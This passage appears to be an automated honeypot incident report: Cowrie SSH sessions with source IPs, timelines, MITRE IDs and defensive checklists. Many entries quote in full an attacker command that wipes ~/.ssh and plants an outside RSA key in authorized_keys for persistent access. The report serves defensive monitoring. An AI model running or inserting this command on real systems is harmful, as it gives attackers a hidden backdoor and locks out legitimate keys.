| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:44 |
| **Last Seen** | 2026-06-02 13:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:44:51` | `cowrie.session.connect` |
| `2026-06-02 13:44:51` | `cowrie.client.version` |
| `2026-06-02 13:44:51` | `cowrie.client.kex` |
| `2026-06-02 13:44:52` | `cowrie.login.success` |
| `2026-06-02 13:44:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50714381e873

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:46 |
| **Last Seen** | 2026-06-02 13:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:46:56` | `cowrie.session.connect` |
| `2026-06-02 13:46:56` | `cowrie.client.version` |
| `2026-06-02 13:46:56` | `cowrie.client.kex` |
| `2026-06-02 13:46:57` | `cowrie.login.success` |
| `2026-06-02 13:46:57` | `cowrie.session.params` |
| `2026-06-02 13:46:57` | `cowrie.command.input` |
| `2026-06-02 13:46:57` | `cowrie.command.failed` |
| `2026-06-02 13:46:57` | `cowrie.log.closed` |
| `2026-06-02 13:46:57` | `cowrie.session.params` |
| `2026-06-02 13:46:57` | `cowrie.command.input` |
| `2026-06-02 13:46:57` | `cowrie.session.file_download` |
| `2026-06-02 13:46:57` | `cowrie.log.closed` |
| `2026-06-02 13:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-236a772e6ccc

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:46 |
| **Last Seen** | 2026-06-02 13:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:46:59` | `cowrie.session.connect` |
| `2026-06-02 13:46:59` | `cowrie.client.version` |
| `2026-06-02 13:46:59` | `cowrie.client.kex` |
| `2026-06-02 13:47:00` | `cowrie.login.success` |
| `2026-06-02 13:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1787caedaea

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:51 |
| **Last Seen** | 2026-06-02 13:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:51:00` | `cowrie.session.connect` |
| `2026-06-02 13:51:00` | `cowrie.client.version` |
| `2026-06-02 13:51:00` | `cowrie.client.kex` |
| `2026-06-02 13:51:01` | `cowrie.login.success` |
| `2026-06-02 13:51:01` | `cowrie.session.params` |
| `2026-06-02 13:51:01` | `cowrie.command.input` |
| `2026-06-02 13:51:01` | `cowrie.command.failed` |
| `2026-06-02 13:51:01` | `cowrie.log.closed` |
| `2026-06-02 13:51:01` | `cowrie.session.params` |
| `2026-06-02 13:51:01` | `cowrie.command.input` |
| `2026-06-02 13:51:01` | `cowrie.session.file_download` |
| `2026-06-02 13:51:01` | `cowrie.log.closed` |
| `2026-06-02 13:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-172af8d1fb3f

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:51 |
| **Last Seen** | 2026-06-02 13:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:51:03` | `cowrie.session.connect` |
| `2026-06-02 13:51:03` | `cowrie.client.version` |
| `2026-06-02 13:51:03` | `cowrie.client.kex` |
| `2026-06-02 13:51:04` | `cowrie.login.success` |
| `2026-06-02 13:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f660f69f3387

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:53 |
| **Last Seen** | 2026-06-02 13:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:53:06` | `cowrie.session.connect` |
| `2026-06-02 13:53:06` | `cowrie.client.version` |
| `2026-06-02 13:53:06` | `cowrie.client.kex` |
| `2026-06-02 13:53:06` | `cowrie.login.success` |
| `2026-06-02 13:53:07` | `cowrie.session.params` |
| `2026-06-02 13:53:07` | `cowrie.command.input` |
| `2026-06-02 13:53:07` | `cowrie.command.failed` |
| `2026-06-02 13:53:07` | `cowrie.log.closed` |
| `2026-06-02 13:53:07` | `cowrie.session.params` |
| `2026-06-02 13:53:07` | `cowrie.command.input` |
| `2026-06-02 13:53:07` | `cowrie.session.file_download` |
| `2026-06-02 13:53:07` | `cowrie.log.closed` |
| `2026-06-02 13:53:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d306bc23ec81

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:53 |
| **Last Seen** | 2026-06-02 13:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:53:09` | `cowrie.session.connect` |
| `2026-06-02 13:53:09` | `cowrie.client.version` |
| `2026-06-02 13:53:09` | `cowrie.client.kex` |
| `2026-06-02 13:53:09` | `cowrie.login.success` |
| `2026-06-02 13:53:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faeb6c906446

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:57 |
| **Last Seen** | 2026-06-02 13:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:57:16` | `cowrie.session.connect` |
| `2026-06-02 13:57:16` | `cowrie.client.version` |
| `2026-06-02 13:57:16` | `cowrie.client.kex` |
| `2026-06-02 13:57:17` | `cowrie.login.success` |
| `2026-06-02 13:57:17` | `cowrie.session.params` |
| `2026-06-02 13:57:17` | `cowrie.command.input` |
| `2026-06-02 13:57:17` | `cowrie.command.failed` |
| `2026-06-02 13:57:17` | `cowrie.log.closed` |
| `2026-06-02 13:57:17` | `cowrie.session.params` |
| `2026-06-02 13:57:17` | `cowrie.command.input` |
| `2026-06-02 13:57:18` | `cowrie.session.file_download` |
| `2026-06-02 13:57:18` | `cowrie.log.closed` |
| `2026-06-02 13:57:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ecdd27d7a5d

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 13:57 |
| **Last Seen** | 2026-06-02 13:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 13:57:19` | `cowrie.session.connect` |
| `2026-06-02 13:57:19` | `cowrie.client.version` |
| `2026-06-02 13:57:19` | `cowrie.client.kex` |
| `2026-06-02 13:57:20` | `cowrie.login.success` |
| `2026-06-02 13:57:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8059c5dea35

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 14:01 |
| **Last Seen** | 2026-06-02 14:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 14:01:30` | `cowrie.session.connect` |
| `2026-06-02 14:01:30` | `cowrie.client.version` |
| `2026-06-02 14:01:30` | `cowrie.client.kex` |
| `2026-06-02 14:01:30` | `cowrie.login.success` |
| `2026-06-02 14:01:31` | `cowrie.session.params` |
| `2026-06-02 14:01:31` | `cowrie.command.input` |
| `2026-06-02 14:01:31` | `cowrie.command.failed` |
| `2026-06-02 14:01:31` | `cowrie.log.closed` |
| `2026-06-02 14:01:31` | `cowrie.session.params` |
| `2026-06-02 14:01:31` | `cowrie.command.input` |
| `2026-06-02 14:01:31` | `cowrie.session.file_download` |
| `2026-06-02 14:01:31` | `cowrie.log.closed` |
| `2026-06-02 14:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce270abb8cdb

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 14:01 |
| **Last Seen** | 2026-06-02 14:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 14:01:33` | `cowrie.session.connect` |
| `2026-06-02 14:01:33` | `cowrie.client.version` |
| `2026-06-02 14:01:33` | `cowrie.client.kex` |
| `2026-06-02 14:01:34` | `cowrie.login.success` |
| `2026-06-02 14:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fea54cc23a62

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 14:05 |
| **Last Seen** | 2026-06-02 14:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 14:05:37` | `cowrie.session.connect` |
| `2026-06-02 14:05:37` | `cowrie.client.version` |
| `2026-06-02 14:05:37` | `cowrie.client.kex` |
| `2026-06-02 14:05:38` | `cowrie.login.success` |
| `2026-06-02 14:05:38` | `cowrie.session.params` |
| `2026-06-02 14:05:38` | `cowrie.command.input` |
| `2026-06-02 14:05:38` | `cowrie.command.failed` |
| `2026-06-02 14:05:38` | `cowrie.log.closed` |
| `2026-06-02 14:05:38` | `cowrie.session.params` |
| `2026-06-02 14:05:38` | `cowrie.command.input` |
| `2026-06-02 14:05:38` | `cowrie.session.file_download` |
| `2026-06-02 14:05:38` | `cowrie.log.closed` |
| `2026-06-02 14:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07925f1e25dc

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-02 14:05 |
| **Last Seen** | 2026-06-02 14:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 14:05:40` | `cowrie.session.connect` |
| `2026-06-02 14:05:40` | `cowrie.client.version` |
| `2026-06-02 14:05:40` | `cowrie.client.kex` |
| `2026-06-02 14:05:41` | `cowrie.login.success` |
| `2026-06-02 14:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-160052319eca

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-06-02 14:06 |
| **Last Seen** | 2026-06-02 14:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 14:06:05` | `cowrie.session.connect` |
| `2026-06-02 14:06:05` | `cowrie.client.version` |
| `2026-06-02 14:06:06` | `cowrie.client.kex` |
| `2026-06-02 14:06:07` | `cowrie.login.success` |
| `2026-06-02 14:06:07` | `cowrie.session.params` |
| `2026-06-02 14:06:07` | `cowrie.command.input` |
| `2026-06-02 14:06:07` | `cowrie.command.failed` |
| `2026-06-02 14:06:08` | `cowrie.log.closed` |
| `2026-06-02 14:06:08` | `cowrie.session.params` |
| `2026-06-02 14:06:08` | `cowrie.command.input` |
| `2026-06-02 14:06:08` | `cowrie.session.file_download` |
| `2026-06-02 14:06:08` | `cowrie.log.closed` |
| `2026-06-02 14:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b24e301c1338

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-06-02 14:06 |
| **Last Seen** | 2026-06-02 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 14:06:11` | `cowrie.session.connect` |
| `2026-06-02 14:06:11` | `cowrie.client.version` |
| `2026-06-02 14:06:11` | `cowrie.client.kex` |
| `2026-06-02 14:06:12` | `cowrie.login.success` |
| `2026-06-02 14:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c690b60b44b

| Field | Detail |
|---|---|
| **Source IP** | `118.186.7[.]10` |
| **First Seen** | 2026-06-02 15:28 |
| **Last Seen** | 2026-06-02 15:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:28:23` | `cowrie.session.connect` |
| `2026-06-02 15:28:23` | `cowrie.client.version` |
| `2026-06-02 15:28:23` | `cowrie.client.kex` |
| `2026-06-02 15:28:24` | `cowrie.login.success` |
| `2026-06-02 15:28:24` | `cowrie.session.params` |
| `2026-06-02 15:28:24` | `cowrie.command.input` |
| `2026-06-02 15:28:24` | `cowrie.command.failed` |
| `2026-06-02 15:28:24` | `cowrie.log.closed` |
| `2026-06-02 15:28:25` | `cowrie.session.params` |
| `2026-06-02 15:28:25` | `cowrie.command.input` |
| `2026-06-02 15:28:25` | `cowrie.session.file_download` |
| `2026-06-02 15:28:25` | `cowrie.log.closed` |
| `2026-06-02 15:28:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.7[.]10` to AbuseIPDB if not already reported
- [ ] Block `118.186.7[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03c4e009e5ea

| Field | Detail |
|---|---|
| **Source IP** | `118.186.7[.]10` |
| **First Seen** | 2026-06-02 15:28 |
| **Last Seen** | 2026-06-02 15:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 15:28:27` | `cowrie.session.connect` |
| `2026-06-02 15:28:27` | `cowrie.client.version` |
| `2026-06-02 15:28:27` | `cowrie.client.kex` |
| `2026-06-02 15:28:28` | `cowrie.login.success` |
| `2026-06-02 15:28:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.7[.]10` to AbuseIPDB if not already reported
- [ ] Block `118.186.7[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cdd03de098a

| Field | Detail |
|---|---|
| **Source IP** | `150.136.129[.]10` |
| **First Seen** | 2026-06-02 15:30 |
| **Last Seen** | 2026-06-02 15:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
